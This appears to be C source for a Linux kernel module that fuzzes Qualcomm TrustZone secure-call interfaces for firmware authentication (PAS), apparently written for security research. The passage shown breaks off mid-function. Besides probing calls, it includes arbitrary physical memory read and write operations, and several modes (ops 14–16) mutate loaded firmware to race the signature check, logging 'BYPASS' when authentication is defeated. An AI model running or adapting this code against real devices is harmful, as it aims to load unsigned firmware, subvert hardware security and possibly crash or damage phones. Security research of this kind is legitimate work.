/*
 * scm_fuzz4.c - SCM fuzzer v4 - ALL operations via direct scm_call2()
 *
 * Fixes v3 crash: qcom_scm_pas_* wrappers dereference __scm->dev (NULL)
 * This version bypasses ALL wrappers and calls scm_call2() directly.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/moduleparam.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kthread.h>
#include <linux/completion.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("SCM PIL Auth Fuzzer v4 - direct scm_call2 only");

/* ---- parameters ---- */
static int op = -1;
static int pid_val = -1;
static int svc_val = -1;
static int cmd_val = -1;
static int meta_type = 0;
static int meta_size = 52;
static unsigned long arg1_val = 0;
static unsigned long arg2_val = 0;
static int nargs = 0;
static char *meta_path = "/tmp/fw_meta.bin";

module_param(op, int, 0);
module_param(pid_val, int, 0);
module_param(svc_val, int, 0);
module_param(cmd_val, int, 0);
module_param(meta_type, int, 0);
module_param(meta_size, int, 0);
module_param(arg1_val, ulong, 0);
module_param(arg2_val, ulong, 0);
module_param(nargs, int, 0);
module_param(meta_path, charp, 0);

MODULE_PARM_DESC(op, "0=pas_supported 1=pas_init 2=pas_shutdown 3=pas_memsetup "
                     "4=raw_scm 5=pas_auth_reset 6=info_query 7=pas_scan_all "
                     "8=svc_explore 9=pas_init_file 10=pas_full_sequence");
MODULE_PARM_DESC(pid_val, "PAS peripheral ID (0-31)");
MODULE_PARM_DESC(svc_val, "SCM service ID (for op=4,6,8)");
MODULE_PARM_DESC(cmd_val, "SCM command ID (for op=4,6,8)");
MODULE_PARM_DESC(meta_type, "0=zero 1=elf 2=0x41fill 3=pattern");
MODULE_PARM_DESC(meta_size, "metadata size in bytes (for op=1)");
MODULE_PARM_DESC(arg1_val, "extra arg1 for raw scm (for op=4)");
MODULE_PARM_DESC(arg2_val, "extra arg2 for raw scm (for op=4)");
MODULE_PARM_DESC(nargs, "number of args for raw scm (for op=4, 0-3)");

/* ---- SCM interface (legacy Qualcomm scm_call2) ---- */
#define MAX_SCM_ARGS 10
#define MAX_SCM_RETS 3

struct scm_desc {
    u32 arginfo;
    u64 args[MAX_SCM_ARGS];
    u64 ret[MAX_SCM_RETS];
};

#define SCM_VAL   0x0
#define SCM_RO    0x1
#define SCM_RW    0x2

#define SCM_ARGS_1(a)       (1 | ((a) << 4))
#define SCM_ARGS_2(a,b)     (2 | ((a) << 4) | ((b) << 6))
#define SCM_ARGS_3(a,b,c)   (3 | ((a) << 4) | ((b) << 6) | ((c) << 8))

#define QCOM_SCM_FNID(svc, cmd)   (((svc) & 0xFF) << 8 | ((cmd) & 0xFF))
#define SCM_SIP_FNID(svc, cmd)    (0x42000000UL | QCOM_SCM_FNID(svc, cmd))

/* PAS service = 0x02 */
#define PAS_SVC                   0x02
#define PAS_INIT_IMAGE_CMD        0x01
#define PAS_MEM_SETUP_CMD         0x02
#define PAS_AUTH_AND_RESET_CMD    0x05
#define PAS_SHUTDOWN_CMD          0x06
#define PAS_IS_SUPPORTED_CMD      0x07

extern int scm_call2(u32 fn_id, struct scm_desc *desc);
extern bool scm_is_call_available(u32 svc_id, u32 cmd_id);

/* ---- Minimal ELF header for metadata fuzzing ---- */
static const u8 minimal_elf_hdr[] = {
    0x7f, 'E', 'L', 'F', 0x01, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0xa4, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
};

/* ---- Helper: direct PAS_IS_SUPPORTED ---- */
static int do_pas_supported(u32 peripheral, int *supported)
{
    struct scm_desc desc;
    int ret;

    memset(&desc, 0, sizeof(desc));
    desc.arginfo = SCM_ARGS_1(SCM_VAL);
    desc.args[0] = peripheral;

    ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_IS_SUPPORTED_CMD), &desc);
    if (ret == 0)
        *supported = (int)desc.ret[0];
    return ret;
}

/* ---- Helper: direct PAS_INIT_IMAGE ---- */
static int do_pas_init_image(u32 peripheral, void *meta_virt, size_t size)
{
    struct scm_desc desc;
    phys_addr_t meta_phys;

    meta_phys = virt_to_phys(meta_virt);

    memset(&desc, 0, sizeof(desc));
    desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_RW);
    desc.args[0] = peripheral;
    desc.args[1] = meta_phys;

    pr_info("scm_fuzz4: pas_init_image: pid=0x%x phys=0x%llx size=%zu\n",
            peripheral, (u64)meta_phys, size);

    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_INIT_IMAGE_CMD), &desc);
}

/* ---- Helper: direct PAS_MEM_SETUP ---- */
static int do_pas_mem_setup(u32 peripheral, phys_addr_t addr, phys_addr_t size)
{
    struct scm_desc desc;

    memset(&desc, 0, sizeof(desc));
    desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
    desc.args[0] = peripheral;
    desc.args[1] = addr;
    desc.args[2] = size;

    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_MEM_SETUP_CMD), &desc);
}

/* ---- Helper: direct PAS_AUTH_AND_RESET ---- */
static int do_pas_auth_reset(u32 peripheral)
{
    struct scm_desc desc;

    memset(&desc, 0, sizeof(desc));
    desc.arginfo = SCM_ARGS_1(SCM_VAL);
    desc.args[0] = peripheral;

    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_AUTH_AND_RESET_CMD), &desc);
}

/* ---- Helper: direct PAS_SHUTDOWN ---- */
static int do_pas_shutdown(u32 peripheral)
{
    struct scm_desc desc;

    memset(&desc, 0, sizeof(desc));
    desc.arginfo = SCM_ARGS_1(SCM_VAL);
    desc.args[0] = peripheral;

    return scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_SHUTDOWN_CMD), &desc);
}

/* ---- TOCTOU race thread data ---- */
static DECLARE_COMPLETION(race_start);
static DECLARE_COMPLETION(race_end);
static volatile int race_should_stop;
static void __iomem *race_pil;
static int race_off;
static int race_loops;

static int race_thread_fn(void *data)
{
    wait_for_completion(&race_start);
    while (!race_should_stop) {
        if (race_pil) {
            u32 v = readl(race_pil + race_off);
            writel(v ^ 0xFFFFFFFF, race_pil + race_off);
            /* Flip back immediately — if TZ reads between the two writes,
             * it sees corrupted data but hash might still pass if it
             * reads the restored value */
            v = readl(race_pil + race_off);
            writel(v ^ 0xFFFFFFFF, race_pil + race_off);
            race_loops++;
        }
    }
    complete(&race_end);
    return 0;
}

/* ---- Init ---- */
static int __init scm_fuzz_init(void)
{
    int ret, supported;
    void *meta_buf;
    struct scm_desc desc;
    u32 pid;

    pr_info("scm_fuzz4: === START === op=%d pid=0x%x svc=0x%x cmd=0x%x "
            "meta_type=%d meta_size=%d nargs=%d arg1=0x%lx arg2=0x%lx\n",
            op, pid_val, svc_val, cmd_val,
            meta_type, meta_size, nargs, arg1_val, arg2_val);

    switch (op) {
    case 0: /* pas_supported - single PID */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        ret = do_pas_supported((u32)pid_val, &supported);
        pr_info("scm_fuzz4: RESULT pas_supported(0x%x) ret=%d supported=%d\n",
                pid_val, ret, ret == 0 ? supported : -1);
        break;

    case 1: /* pas_init_image - with metadata buffer */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        if (meta_size < 1 || meta_size > 4096) meta_size = 52;

        /* Use __get_free_pages for guaranteed physically contiguous DMA-safe memory */
        meta_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO,
                                            get_order(meta_size));
        if (!meta_buf) {
            pr_err("scm_fuzz4: alloc failed\n");
            return -ENOMEM;
        }

        switch (meta_type) {
        case 0: /* zero-filled (already zeroed) */
            break;
        case 1: /* ELF header */
            if (meta_size >= sizeof(minimal_elf_hdr))
                memcpy(meta_buf, minimal_elf_hdr, sizeof(minimal_elf_hdr));
            break;
        case 2: /* 0x41 fill */
            memset(meta_buf, 0x41, meta_size);
            break;
        case 3: /* pattern fill */
            {
                u8 *p = meta_buf;
                int i;
                for (i = 0; i < meta_size; i++)
                    p[i] = (u8)(i * 7 + 0x5a);
            }
            break;
        }

        ret = do_pas_init_image((u32)pid_val, meta_buf, meta_size);
        pr_info("scm_fuzz4: RESULT pas_init_image(0x%x, type=%d, size=%d) ret=%d\n",
                pid_val, meta_type, meta_size, ret);
        free_pages((unsigned long)meta_buf, get_order(meta_size));
        break;

    case 2: /* pas_shutdown */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        ret = do_pas_shutdown((u32)pid_val);
        pr_info("scm_fuzz4: RESULT pas_shutdown(0x%x) ret=%d\n",
                pid_val, ret);
        break;

    case 3: /* pas_mem_setup */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        ret = do_pas_mem_setup((u32)pid_val, 0, 0);
        pr_info("scm_fuzz4: RESULT pas_mem_setup(0x%x, 0, 0) ret=%d\n",
                pid_val, ret);
        break;

    case 4: /* raw scm_call2 - with variable args */
        if (svc_val < 0 || cmd_val < 0) {
            pr_err("scm_fuzz4: need svc_val and cmd_val\n");
            return -EINVAL;
        }
        memset(&desc, 0, sizeof(desc));
        switch (nargs) {
        case 0:
            desc.arginfo = 0;
            break;
        case 1:
            desc.arginfo = SCM_ARGS_1(SCM_VAL);
            desc.args[0] = arg1_val;
            break;
        case 2:
            desc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_VAL);
            desc.args[0] = arg1_val;
            desc.args[1] = arg2_val;
            break;
        case 3:
            desc.arginfo = SCM_ARGS_3(SCM_VAL, SCM_VAL, SCM_VAL);
            desc.args[0] = arg1_val;
            desc.args[1] = arg2_val;
            desc.args[2] = pid_val >= 0 ? (u64)pid_val : 0;
            break;
        default:
            desc.arginfo = 0;
            break;
        }
        ret = scm_call2(SCM_SIP_FNID(svc_val, cmd_val), &desc);
        pr_info("scm_fuzz4: RESULT raw_scm(svc=0x%x,cmd=0x%x,nargs=%d,"
                "a0=0x%llx,a1=0x%llx,a2=0x%llx) ret=%d "
                "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                svc_val, cmd_val, nargs,
                desc.args[0], desc.args[1], desc.args[2],
                ret, desc.ret[0], desc.ret[1], desc.ret[2]);
        break;

    case 5: /* pas_auth_and_reset - DANGEROUS */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        pr_info("scm_fuzz4: WARNING: pas_auth_and_reset(0x%x) - may crash!\n",
                pid_val);
        ret = do_pas_auth_reset((u32)pid_val);
        pr_info("scm_fuzz4: RESULT pas_auth_and_reset(0x%x) ret=%d\n",
                pid_val, ret);
        break;

    case 6: /* info query - safe scm_call2 with 0 args */
        if (svc_val < 0 || cmd_val < 0) {
            pr_err("scm_fuzz4: need svc_val and cmd_val\n");
            return -EINVAL;
        }
        if (!scm_is_call_available(svc_val, cmd_val)) {
            pr_info("scm_fuzz4: RESULT call_not_available svc=0x%x cmd=0x%x\n",
                    svc_val, cmd_val);
            break;
        }
        memset(&desc, 0, sizeof(desc));
        desc.arginfo = 0;
        ret = scm_call2(SCM_SIP_FNID(svc_val, cmd_val), &desc);
        pr_info("scm_fuzz4: RESULT info_query(svc=0x%x,cmd=0x%x) ret=%d "
                "r0=0x%llx r1=0x%llx r2=0x%llx\n",
                svc_val, cmd_val, ret, desc.ret[0], desc.ret[1], desc.ret[2]);
        break;

    case 7: /* pas_scan_all - scan all PIDs for PAS support */
        pr_info("scm_fuzz4: === PAS SUPPORTED SCAN (pid 0-31) ===\n");
        for (pid = 0; pid < 32; pid++) {
            supported = -1;
            ret = do_pas_supported(pid, &supported);
            if (ret == 0 && supported != 0) {
                pr_info("scm_fuzz4: RESULT pas_supported pid=0x%x = %d (SUPPORTED!)\n",
                        pid, supported);
            } else {
                pr_info("scm_fuzz4: RESULT pas_supported pid=0x%x ret=%d val=%d\n",
                        pid, ret, supported);
            }
            msleep(50);
        }
        pr_info("scm_fuzz4: === PAS SCAN COMPLETE ===\n");
        break;

    case 8: /* service exploration - try all cmds for a service with 0 args */
        if (svc_val < 0) {
            pr_err("scm_fuzz4: need svc_val\n");
            return -EINVAL;
        }
        pr_info("scm_fuzz4: === EXPLORE SERVICE 0x%x ===\n", svc_val);
        {
            u32 c;
            for (c = 0; c < 0x20; c++) {
                if (!scm_is_call_available(svc_val, c))
                    continue;
                memset(&desc, 0, sizeof(desc));
                /* Try with 0 args first (safest) */
                desc.arginfo = 0;
                ret = scm_call2(SCM_SIP_FNID(svc_val, c), &desc);
                pr_info("scm_fuzz4: RESULT explore svc=0x%x cmd=0x%02x "
                        "ret=%d r0=0x%llx r1=0x%llx r2=0x%llx\n",
                        svc_val, c, ret,
                        desc.ret[0], desc.ret[1], desc.ret[2]);
                msleep(20);
            }
        }
        pr_info("scm_fuzz4: === EXPLORE COMPLETE ===\n");
        break;

    case 9: /* pas_init_image from file on device */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        {
            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf;
            ssize_t nread;
            struct scm_desc fdesc;
            phys_addr_t fw_phys;

            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) {
                pr_err("scm_fuzz4: cannot open %s: %ld\n",
                       meta_path, PTR_ERR(f));
                return PTR_ERR(f);
            }
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > 1048576) {
                pr_err("scm_fuzz4: bad file size %lld\n", fsize);
                filp_close(f, NULL);
                return -EINVAL;
            }
            /* Allocate physically contiguous pages */
            fw_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO,
                                              get_order(fsize));
            if (!fw_buf) {
                filp_close(f, NULL);
                return -ENOMEM;
            }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);
            if (nread != fsize) {
                pr_err("scm_fuzz4: short read %zd/%lld\n", nread, fsize);
                free_pages((unsigned long)fw_buf, get_order(fsize));
                return -EIO;
            }

            fw_phys = virt_to_phys(fw_buf);
            pr_info("scm_fuzz4: loaded %lld bytes from %s, phys=0x%llx\n",
                    fsize, meta_path, (u64)fw_phys);

            /* Call PAS_INIT_IMAGE */
            memset(&fdesc, 0, sizeof(fdesc));
            fdesc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_RW);
            fdesc.args[0] = (u32)pid_val;
            fdesc.args[1] = fw_phys;

            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_INIT_IMAGE_CMD), &fdesc);
            pr_info("scm_fuzz4: RESULT pas_init_file(pid=0x%x, path=%s, "
                    "size=%lld) ret=%d r0=0x%llx r1=0x%llx\n",
                    pid_val, meta_path, fsize, ret,
                    fdesc.ret[0], fdesc.ret[1]);

            free_pages((unsigned long)fw_buf, get_order(fsize));
        }
        break;

    case 10: /* full PAS sequence: shutdown + init_image(from file) + mem_setup + auth_reset */
        if (pid_val < 0) {
            pr_err("scm_fuzz4: need pid_val\n");
            return -EINVAL;
        }
        {
            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf;
            ssize_t nread;
            struct scm_desc fdesc;
            phys_addr_t fw_phys;
            phys_addr_t mem_addr, mem_size;

            /* Step 1: Shutdown */
            ret = do_pas_shutdown((u32)pid_val);
            pr_info("scm_fuzz4: STEP1 shutdown(0x%x) ret=%d\n", pid_val, ret);
            msleep(100);

            /* Step 2: Load metadata from file */
            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) {
                pr_err("scm_fuzz4: cannot open %s: %ld\n",
                       meta_path, PTR_ERR(f));
                return PTR_ERR(f);
            }
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > 1048576) {
                filp_close(f, NULL);
                return -EINVAL;
            }
            fw_buf = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO,
                                              get_order(fsize));
            if (!fw_buf) {
                filp_close(f, NULL);
                return -ENOMEM;
            }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);
            if (nread != fsize) {
                free_pages((unsigned long)fw_buf, get_order(fsize));
                return -EIO;
            }

            fw_phys = virt_to_phys(fw_buf);
            pr_info("scm_fuzz4: STEP2 metadata loaded %lld bytes phys=0x%llx\n",
                    fsize, (u64)fw_phys);

            /* Step 3: PAS_INIT_IMAGE */
            memset(&fdesc, 0, sizeof(fdesc));
            fdesc.arginfo = SCM_ARGS_2(SCM_VAL, SCM_RW);
            fdesc.args[0] = (u32)pid_val;
            fdesc.args[1] = fw_phys;
            ret = scm_call2(SCM_SIP_FNID(PAS_SVC, PAS_INIT_IMAGE_CMD), &fdesc);
            pr_info("scm_fuzz4: STEP3 init_image(0x%x) ret=%d r0=0x%llx\n",
                    pid_val, ret, fdesc.ret[0]);

            free_pages((unsigned long)fw_buf, get_order(fsize));

            if (ret) {
                pr_info("scm_fuzz4: init_image failed, stopping sequence\n");
                break;
            }

            /* Step 4: PAS_MEM_SETUP - use actual reserved region for this PID */
            mem_addr = arg1_val ? arg1_val : 0x86a00000ULL;
            mem_size = arg2_val ? arg2_val : 0x500000ULL;
            ret = do_pas_mem_setup((u32)pid_val, mem_addr, mem_size);
            pr_info("scm_fuzz4: STEP4 mem_setup(0x%x, 0x%llx, 0x%llx) ret=%d\n",
                    pid_val, (u64)mem_addr, (u64)mem_size, ret);

            if (ret) {
                pr_info("scm_fuzz4: mem_setup failed, stopping sequence\n");
                break;
            }

            /* Step 5: PAS_AUTH_AND_RESET */
            ret = do_pas_auth_reset((u32)pid_val);
            pr_info("scm_fuzz4: STEP5 auth_and_reset(0x%x) ret=%d\n",
                    pid_val, ret);
        }
        break;

    case 11: /* Read physical memory region (ioremap) */
        {
            void __iomem *mapped;
            phys_addr_t phys = arg1_val;
            size_t len = arg2_val ? arg2_val : 256;
            int i;

            if (!phys) {
                pr_err("scm_fuzz4: need arg1_val=phys_addr\n");
                return -EINVAL;
            }
            if (len > 4096) len = 4096;

            mapped = ioremap(phys, len);
            if (!mapped) {
                pr_err("scm_fuzz4: ioremap(0x%llx, %zu) failed\n",
                       (u64)phys, len);
                return -ENOMEM;
            }
            pr_info("scm_fuzz4: mapped phys=0x%llx len=%zu\n",
                    (u64)phys, len);

            /* Read and dump as u32 */
            for (i = 0; i < min(len, (size_t)256) && (i + 28) < len; i += 32) {
                pr_info("scm_fuzz4: MEMDUMP 0x%llx+0x%03x: %08x %08x %08x %08x %08x %08x %08x %08x\n",
                        (u64)phys, i,
                        readl(mapped + i),
                        readl(mapped + i + 4),
                        readl(mapped + i + 8),
                        readl(mapped + i + 12),
                        readl(mapped + i + 16),
                        readl(mapped + i + 20),
                        readl(mapped + i + 24),
                        readl(mapped + i + 28));
            }
            iounmap(mapped);
            pr_info("scm_fuzz4: RESULT memdump phys=0x%llx done\n", (u64)phys);
        }
        break;

    case 12: /* Write test to physical memory region */
        {
            void __iomem *mapped;
            phys_addr_t phys = arg1_val;
            u32 orig_val, test_val = 0xDEADBEEF;

            if (!phys) {
                pr_err("scm_fuzz4: need arg1_val=phys_addr\n");
                return -EINVAL;
            }

            mapped = ioremap(phys, PAGE_SIZE);
            if (!mapped) {
                pr_err("scm_fuzz4: ioremap(0x%llx) failed\n", (u64)phys);
                return -ENOMEM;
            }

            /* Read original value */
            orig_val = readl(mapped);
            pr_info("scm_fuzz4: WRITE_TEST phys=0x%llx original=0x%08x\n",
                    (u64)phys, orig_val);

            /* Try to write */
            writel(test_val, mapped);
            mb(); /* memory barrier */

            /* Read back */
            {
                u32 readback = readl(mapped);
                pr_info("scm_fuzz4: WRITE_TEST phys=0x%llx wrote=0x%08x readback=0x%08x %s\n",
                        (u64)phys, test_val, readback,
                        readback == test_val ? "WRITABLE!" : "PROTECTED");

                /* Restore original if write succeeded */
                if (readback == test_val) {
                    writel(orig_val, mapped);
                    mb();
                    pr_info("scm_fuzz4: WRITE_TEST restored original 0x%08x\n", orig_val);
                }
            }
            iounmap(mapped);
        }
        break;

    case 13: /* Load firmware from file into physical memory + auth_and_reset */
        if (pid_val < 0 || !arg1_val || !arg2_val) {
            pr_err("scm_fuzz4: need pid_val, arg1_val=phys_base, arg2_val=region_size\n");
            return -EINVAL;
        }
        {
            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf;
            ssize_t nread;
            void __iomem *pil_region;
            phys_addr_t pil_base = arg1_val;
            size_t pil_size = arg2_val;

            /* Step 1: Load firmware file into kernel buffer */
            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) {
                pr_err("scm_fuzz4: cannot open %s\n", meta_path);
                return PTR_ERR(f);
            }
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > pil_size) {
                pr_err("scm_fuzz4: file too large %lld > %zu\n", fsize, pil_size);
                filp_close(f, NULL);
                return -EINVAL;
            }

            fw_buf = vmalloc(fsize);
            if (!fw_buf) {
                filp_close(f, NULL);
                return -ENOMEM;
            }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);

            if (nread != fsize) {
                vfree(fw_buf);
                return -EIO;
            }
            pr_info("scm_fuzz4: loaded %lld bytes firmware from %s\n", fsize, meta_path);

            /* Step 2: Map PIL physical region */
            pil_region = ioremap_wc(pil_base, pil_size);
            if (!pil_region) {
                pr_err("scm_fuzz4: ioremap_wc(0x%llx, 0x%zx) failed\n",
                       (u64)pil_base, pil_size);
                vfree(fw_buf);
                return -ENOMEM;
            }

            /* Step 3: Copy firmware to PIL region */
            memcpy_toio(pil_region, fw_buf, fsize);
            /* Zero-fill remainder */
            if (fsize < pil_size) {
                memset_io(pil_region + fsize, 0, pil_size - fsize);
            }
            mb();
            pr_info("scm_fuzz4: copied %lld bytes to phys 0x%llx\n",
                    fsize, (u64)pil_base);

            /* Verify: read back first 32 bytes */
            {
                int i;
                pr_info("scm_fuzz4: verify: ");
                for (i = 0; i < 32; i += 4) {
                    u32 v = readl(pil_region + i);
                    pr_cont("%08x ", v);
                }
                pr_cont("\n");
            }

            iounmap(pil_region);
            vfree(fw_buf);

            /* Step 4: Auth and reset */
            pr_info("scm_fuzz4: calling auth_and_reset(0x%x)...\n", pid_val);
            ret = do_pas_auth_reset((u32)pid_val);
            pr_info("scm_fuzz4: RESULT auth_and_reset(0x%x) ret=%d\n",
                    pid_val, ret);
        }
        break;

    case 14: /* TOCTOU: load firmware, mutate byte(s), then auth */
        if (pid_val < 0 || !arg1_val || !arg2_val) {
            pr_err("scm_fuzz4: need pid_val, arg1_val=phys_base, arg2_val=region_size\n");
            return -EINVAL;
        }
        {
            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf;
            ssize_t nread;
            void __iomem *pil_region;
            phys_addr_t pil_base = arg1_val;
            size_t pil_size = arg2_val;

            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) {
                pr_err("scm_fuzz4: cannot open %s\n", meta_path);
                return PTR_ERR(f);
            }
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > pil_size) {
                filp_close(f, NULL);
                return -EINVAL;
            }
            fw_buf = vmalloc(fsize);
            if (!fw_buf) { filp_close(f, NULL); return -ENOMEM; }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);
            if (nread != fsize) { vfree(fw_buf); return -EIO; }

            pil_region = ioremap_wc(pil_base, pil_size);
            if (!pil_region) { vfree(fw_buf); return -ENOMEM; }

            /* Load valid firmware */
            memcpy_toio(pil_region, fw_buf, fsize);
            if (fsize < pil_size)
                memset_io(pil_region + fsize, 0, pil_size - fsize);
            mb();
            pr_info("scm_fuzz4: TOCTOU loaded %lld bytes\n", fsize);

            /* MUTATE: use meta_type as mutation offset, meta_size as mutation byte count */
            {
                int mut_off = meta_type; /* offset to mutate */
                int mut_cnt = meta_size; /* bytes to mutate (default 52) */
                int i;
                if (mut_cnt <= 0) mut_cnt = 1;
                if (mut_off < 0) mut_off = 0;
                if (mut_off + mut_cnt > fsize) mut_cnt = fsize - mut_off;

                pr_info("scm_fuzz4: TOCTOU mutating %d bytes at offset 0x%x\n",
                        mut_cnt, mut_off);
                for (i = 0; i < mut_cnt; i++) {
                    u8 orig = readb(pil_region + mut_off + i);
                    writeb(orig ^ 0xFF, pil_region + mut_off + i);
                }
                mb();
            }

            iounmap(pil_region);
            vfree(fw_buf);

            /* Auth with mutated firmware */
            pr_info("scm_fuzz4: TOCTOU calling auth_and_reset(0x%x)...\n", pid_val);
            ret = do_pas_auth_reset((u32)pid_val);
            pr_info("scm_fuzz4: TOCTOU RESULT auth_and_reset(0x%x) ret=%d %s\n",
                    pid_val, ret, ret == 0 ? "*** BYPASS! ***" : "rejected");
        }
        break;

    case 15: /* TOCTOU race: load valid fw, start auth, mutate concurrently via timer */
        if (pid_val < 0 || !arg1_val || !arg2_val) {
            pr_err("scm_fuzz4: need pid_val, arg1_val=phys_base, arg2_val=region_size\n");
            return -EINVAL;
        }
        {
            void __iomem *pil_region;
            phys_addr_t pil_base = arg1_val;
            size_t pil_size = arg2_val;
            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf;
            ssize_t nread;

            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) return PTR_ERR(f);
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > pil_size) { filp_close(f, NULL); return -EINVAL; }
            fw_buf = vmalloc(fsize);
            if (!fw_buf) { filp_close(f, NULL); return -ENOMEM; }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);
            if (nread != fsize) { vfree(fw_buf); return -EIO; }

            /* We'll do multiple attempts with different timing */
            {
                int attempt;
                int max_attempts = (meta_type > 0) ? meta_type : 10;

                for (attempt = 0; attempt < max_attempts; attempt++) {
                    int mut_off = 0x1000 + (attempt * 0x100); /* vary mutation offset */

                    /* Full sequence for each attempt */
                    do_pas_shutdown((u32)pid_val);
                    msleep(10);

                    /* Re-init image - need to re-read metadata */
                    {
                        struct file *mf;
                        void *mdt_buf;
                        loff_t mdt_size, mpos = 0;
                        ssize_t mr;

                        mf = filp_open("/tmp/fw_meta.bin", O_RDONLY, 0);
                        if (IS_ERR(mf)) { pr_err("scm_fuzz4: race: cant open mdt\n"); break; }
                        mdt_size = i_size_read(file_inode(mf));
                        mdt_buf = kzalloc(mdt_size, GFP_KERNEL | GFP_DMA);
                        if (!mdt_buf) { filp_close(mf, NULL); break; }
                        mr = kernel_read(mf, mdt_buf, mdt_size, &mpos);
                        filp_close(mf, NULL);
                        if (mr != mdt_size) { kfree(mdt_buf); break; }
                        ret = do_pas_init_image((u32)pid_val, mdt_buf, mdt_size);
                        kfree(mdt_buf);
                        if (ret) { pr_err("scm_fuzz4: race: init_image failed %d\n", ret); break; }
                    }

                    /* mem_setup */
                    ret = do_pas_mem_setup((u32)pid_val, pil_base, pil_size);
                    if (ret) { pr_err("scm_fuzz4: race: mem_setup failed %d\n", ret); break; }

                    /* Load valid firmware */
                    pil_region = ioremap_wc(pil_base, pil_size);
                    if (!pil_region) break;
                    memcpy_toio(pil_region, fw_buf, fsize);
                    if (fsize < pil_size)
                        memset_io(pil_region + fsize, 0, pil_size - fsize);
                    mb();

                    /* Don't unmap yet — need to write during auth */

                    /* Fire auth on another CPU via IPI / work queue... but simpler:
                     * Just modify memory immediately before calling auth.
                     * The idea is that TZ might cache/prefetch early segments while
                     * we modify later segments. */
                    if (mut_off < fsize) {
                        /* Variant: modify a late segment so TZ might have already
                         * validated early segments by the time it gets there */
                        writeb(readb(pil_region + mut_off) ^ 0x01, pil_region + mut_off);
                        mb();
                        pr_info("scm_fuzz4: race[%d] mutated offset 0x%x\n", attempt, mut_off);
                    }

                    ret = do_pas_auth_reset((u32)pid_val);
                    iounmap(pil_region);

                    pr_info("scm_fuzz4: race[%d] auth_and_reset ret=%d %s\n",
                            attempt, ret, ret == 0 ? "*** BYPASS! ***" : "rejected");

                    if (ret == 0) {
                        pr_info("scm_fuzz4: *** TOCTOU RACE WON at attempt %d offset 0x%x ***\n",
                                attempt, mut_off);
                        break;
                    }

                    msleep(50); /* brief delay between attempts */
                }
            }
            vfree(fw_buf);
        }
        break;

    case 16: /* True concurrent TOCTOU: kthread writes while auth_and_reset runs */
        if (pid_val < 0 || !arg1_val || !arg2_val) {
            pr_err("scm_fuzz4: need pid_val, arg1_val=phys_base, arg2_val=region_size\n");
            return -EINVAL;
        }
        {
            int race_mut_off;

            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf, *fw_backup;
            ssize_t nread;
            phys_addr_t pil_base = arg1_val;
            size_t pil_size = arg2_val;
            int attempt;
            int max_attempts = (meta_type > 0) ? meta_type : 20;

            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) return PTR_ERR(f);
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > pil_size) { filp_close(f, NULL); return -EINVAL; }
            fw_buf = vmalloc(fsize);
            fw_backup = vmalloc(fsize);
            if (!fw_buf || !fw_backup) {
                if (fw_buf) vfree(fw_buf);
                if (fw_backup) vfree(fw_backup);
                filp_close(f, NULL);
                return -ENOMEM;
            }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);
